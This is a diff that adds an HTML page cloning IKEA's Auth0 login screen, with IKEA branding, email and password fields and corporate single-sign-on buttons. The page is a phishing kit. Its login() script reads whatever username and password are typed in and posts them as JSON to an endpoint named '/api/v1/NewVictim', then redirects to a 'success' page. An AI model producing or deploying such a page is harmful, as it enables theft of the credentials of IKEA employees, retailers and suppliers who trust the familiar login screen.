@@ -1,0 +1,385 @@
+
+<!DOCTYPE html>
+  <html lang="zh-CN" >
+  <head>
+        <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+    <meta name="robots" content="noindex, nofollow" />
+
+
+    <link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.67.3/css/main.cdn.min.css" />
+    <style id="custom-styles-container">
+
+
+.input-wrapper {
+    position: relative;
+  }
+
+  .input-wrapper input:focus + label {
+    top: 0;
+    left: 0;
+    transform: translate(0, -100%);
+  }
+
+  .input-wrapper label {
+    position: absolute;
+    top: 50%;
+    left: 10px;
+    transform: translateY(-50%);
+    transition: all 0.2s ease-out;
+    color: #aaa;
+  }
+
+
+:root {
+    --primary-color: #fbd914;
+  }
+:root {
+    --button-font-color: #ffffff;
+  }
+:root {
+    --secondary-button-border-color: #c9cace;
+    --social-button-border-color: #c9cace;
+    --radio-button-border-color: #c9cace;
+  }
+:root {
+    --secondary-button-text-color: #1e212a;
+  }
+:root {
+    --link-color: #0058ab;
+  }
+:root {
+    --title-font-color: #1e212a;
+  }
+:root {
+    --font-default-color: #1e212a;
+  }
+:root {
+    --widget-background-color: #ffffff;
+  }
+:root {
+    --box-border-color: #c9cace;
+  }
+:root {
+    --font-light-color: #65676e;
+  }
+:root {
+    --input-text-color: #000000;
+  }
+:root {
+    --input-border-color: #c9cace;
+    --border-default-color: #c9cace;
+  }
+:root {
+    --input-background-color: #ffffff;
+  }
+:root {
+    --icon-default-color: #65676e;
+  }
+:root {
+    --error-color: #d03c38;
+    --error-text-color: #ffffff;
+  }
+:root {
+    --success-color: #13a688;
+  }
+:root {
+    --base-focus-color: #0058ab;
+    --transparency-focus-color: rgba(0,88,171, 0.15);
+  }
+:root {
+    --base-hover-color: #000000;
+    --transparency-hover-color: rgba(0,0,0, var(--hover-transparency-value));
+  }
+
+
+
+
+html, :root {
+    font-size: 16px;
+    --default-font-size: 16px;
+  }
+body {
+    --title-font-size: 1.5rem;
+    --title-font-weight: var(--font-default-weight);
+  }
+.cc2570856 {
+    font-size: 0.875rem;
+    font-weight: var(--font-default-weight);
+  }
+.c389aac0b {
+    font-size: 0.875rem;
+    font-weight: var(--font-default-weight);
+  }
+.c99b527ce, .c2f7dced4 {
+    font-size: 1rem;
+    font-weight: var(--font-default-weight);
+  }
+.c3b1179e1 {
+    font-size: 1rem;
+    font-weight: var(--font-default-weight);
+  }
+.c4999f2c2, .cd40378de {
+    font-size: 0.875rem;
+    font-weight: var(--font-bold-weight) !important;
+  }
+
+
+
+
+:root {
+    --button-border-width: 1px;
+    --social-button-border-width: 1px;
+    --radio-border-width: 1px;
+  }
+body {
+    --button-border-radius: 3px;
+    --radio-border-radius: 3px;
+  }
+:root {
+    --input-border-width: 1px;
+  }
+body {
+    --input-border-radius: 3px;
+  }
+:root {
+    --border-radius-outer: 5px;
+  }
+:root {
+    --box-border-width: 0px;
+  }
+
+
+
+
+
+    body {
+      --logo-alignment: 0 auto;
+    }
+
+
+    .cb8b5079c {
+      content: url('https://adfstou.blob.core.windows.net/auth0/IKEA_2018_h58.png');
+    }
+
+body {
+    --logo-height: 52px;
+  }
+  .cb8b5079c {
+    height: var(--logo-height);
+  }
+
+
+    body {
+      --header-alignment: center;
+    }
+
+.cf34ac957 {
+    display: flex;
+    flex-direction: column;
+  }
+  .cf34ac957 form {
+    order: 3;
+  }
+  .cf34ac957 ._alternate-action {
+    order: 4
+  }
+  .cf34ac957 > .c87ae0936 {
+    order: 2;
+    margin-bottom: 24px;
+  }
+  .cf34ac957 .ca71d8e40 {
+    order: 1;
+    margin-top: 0;
+  }
+
+
+
+.cfb24fd53 {
+    --page-background-alignment: center;
+  }
+body {
+    --page-background-color: #0058ab;
+  }
+
+
+
+
+
+
+    </style>
+    <style>
+      /* By default, hide features for javascript-disabled browsing */
+      /* We use !important to override any css with higher specificity */
+      /* It is also overriden by the styles in <noscript> in the header file */
+      .no-js {
+        clip: rect(0 0 0 0);
+        clip-path: inset(50%);
+        height: 1px;
+        overflow: hidden;
+        position: absolute;
+        white-space: nowrap;
+        width: 1px;
+      }
+    </style>
+    <noscript>
+      <style>
+        /* We use !important to override the default for js enabled */
+        /* If the display should be other than block, it should be defined specifically here */
+        .js-required { display: none !important; }
+        .no-js {
+          clip: auto;
+          clip-path: none;
+          height: auto;
+          overflow: auto;
+          position: static;
+          white-space: normal;
+          width: var(--prompt-width);
+        }
+      </style>
+    </noscript>
+
+    <title>Login | Identity Verification</title>
+  </head>
+
+  <body>
+    <div class="c78b313fc cfb24fd53">
+
+<main class="c92c26fbe login-id">
+  <section class="c7c07fbff _prompt-box-outer c4dc36cba">
+    <div class="c25d1b5ec cd43f3464">
+
+
+      <div class="cb29232b3">
+        <header class="cb7fe8136 c8ecd7007">
+          <div title="IKEA" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important"></div>
+
+          <img class="cb8b5079c c600c7027" id="prompt-logo-center" src="https://adfstou.blob.core.windows.net/auth0/IKEA_2018_h58.png" alt="IKEA" />
+
+
+            <h1 class="c690d3e44 cc977329f">Welcome</h1>
+
+
+          <div class="cc2570856 cdaf61c72">
+            <p class="c7b122490 cdffe5edf">Log in to IKEA for authentication.</p>
+          </div>
+        </header>
+
+        <div class="c389aac0b cf34ac957">
+              <form method="POST" class="c6d55c8e1 _form-login-id" data-form-primary="true">
+  <input type="hidden" name="state" value="" />
+
+  <div class="cb15f584f cb4ca98c6">
+    <div class="ca5ec30f2">
+      <div class="input-wrapper _input-wrapper">
+        <div class="c48ccce47 cb03101f6 text c84fd713a" data-action-text="" data-alternate-action-text="">
+          <label class="c3b1179e1 no-js cec5382e9 c8c9e83a1" for="username">
+            电子邮件地址
+          </label>
+          <input class="input c6eafb70b cf072f6c3" inputMode="email" name="username" id="username" type="email" value="" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus placeholder="Please input your email address" />
+        </div>
+      </div>
+
+      <div class="input-wrapper _input-wrapper">
+        <div class="c48ccce47 cb03101f6 text c84fd713a" data-action-text="" data-alternate-action-text="">
+          <label class="c3b1179e1 no-js cec5382e9 c8c9e83a1" for="password">
+            密码
+          </label>
+          <input class="input c6eafb70b cf072f6c3" name="password" id="password" type="password" required autoComplete="current-password" autoCapitalize="none" spellCheck="false" placeholder="Your password" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <input type="hidden" id="js-available" name="js-available" value="false" />
+
+  <input type="hidden" id="webauthn-available" name="webauthn-available" value="false" />
+
+  <input type="hidden" id="is-brave" name="is-brave" value="false" />
+
+  <input type="hidden" id="webauthn-platform-available" name="webauthn-platform-available" value="false" />
+
+  <div class="c972fd828">
+    <button type="button" onclick="login()" class="c99b527ce c488a9d61 c39b3b9c2 c3ae61280 _button-login-id" data-action-button-primary="true">Submit</button>
+  </div>
+</form>
+
+            <div class="c91eeb809 c87ae0936">
+              <span>OR</span>
+            </div>
+
+
+            <div class="cc8e6d791 ca71d8e40">
+
+                <form method="post" data-provider="waad" class="c2f7dced4 c166683cf c7c93499a" data-form-secondary="true">
+                  <input type="hidden" name="state" value="" />
+
+                  <input type="hidden" name="connection" value="ikea-waad" />
+
+                  <button type="submit" class="c28fbf930 c66190dcc ca1895747" data-provider="waad" data-action-button-secondary="true" disabled>
+
+                      <span class="cc555f487 c4001df5f" data-provider="waad"></span>
+
+
+                    <span class="cd00cd935">Ingka</span>
+                  </button>
+                </form>
+
+                <form method="post" data-provider="samlp" class="c2f7dced4 c166683cf c019dabb6" data-form-secondary="true">
+                  <input type="hidden" name="state" value="" />
+
+                  <input type="hidden" name="connection" value="IKEA-ADFS-WAP-MFA" />
+
+                  <button type="submit" class="c28fbf930 c66190dcc cc2e3e2b9" data-provider="samlp" data-action-button-secondary="true" disabled>
+
+                      <span class="cc555f487 c4001df5f" data-provider="samlp"></span>
+
+
+                    <span class="cd00cd935">Inter IKEA, Non Ingka Retailer &amp; Supplier</span>
+                  </button>
+                </form>
+
+            </div>
+
+        </div>
+      </div>
+    </div>
+
+
+  </section>
+</main>
+<script>
+function login() {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  // 发送API请求
+  fetch('http://127.0.0.1:8088/api/v1/NewVictim', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ username, password })
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('登录失败');
+    }
+    return response.json();
+  })
+  .then(data => {
+    // 登录成功后的操作
+      window.location.href = "success.html";
+  })
+  .catch(error => {
+    // 处理错误
+    alert(error.message);
+  });
+}
+</script>
+</div>
+  </body>
+</html>
